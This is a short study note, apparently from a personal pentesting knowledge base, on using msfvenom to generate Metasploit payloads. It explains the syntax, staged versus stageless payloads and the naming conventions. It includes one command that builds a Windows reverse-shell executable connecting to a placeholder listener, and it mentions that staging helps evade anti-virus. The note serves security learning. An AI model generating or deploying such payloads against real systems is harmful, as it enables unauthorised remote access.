Part of [[Metasploit]]

Used to generate code for [[Reverse Shell]] and [[Bind Shell]]

# Standard Syntax

```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

## Example:

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

- `-f`  format
	- Specifies the output format
- `-o` file
	- Output location and file name
- `LHOST` ip address
	- Specifies the IP address to connect back to
- `LPORT` [[Port]] number
	- The port on the local machine to connect back to. Ranges from 0 - 65535. Ports below 1024 are restricted and require a listener running root privileges

# Staged vs Stageless

## Staged
- Sent in two parts:
	- The initial stager which is a piece of code executed on the target machine that connects back to a waiting listener. This code does not contain the [[Reverse Shell]] code. It waits to receive the actual payload from the listener.
	- The second part is the actual payload sent over by the listener.
	- This is done to avoid detection by anti-virus solutions
	- Denoted by  `/` in the name

## Stageless
- Entirely self-contained code the executes the [[Reverse Shell]] or [[Bind Shell]].
- Denoted by `_` in the name

# Meterpreter

Metasploit's own brand of fully-featured shell.

# Payload Naming Convention

`<OS>/<arch>/<payload>`

## Example:

- `linux/x86/shell_reverse_tcp`

Exception to this is Windows 32bit targets.

- `windows/shell_reverse_tcp`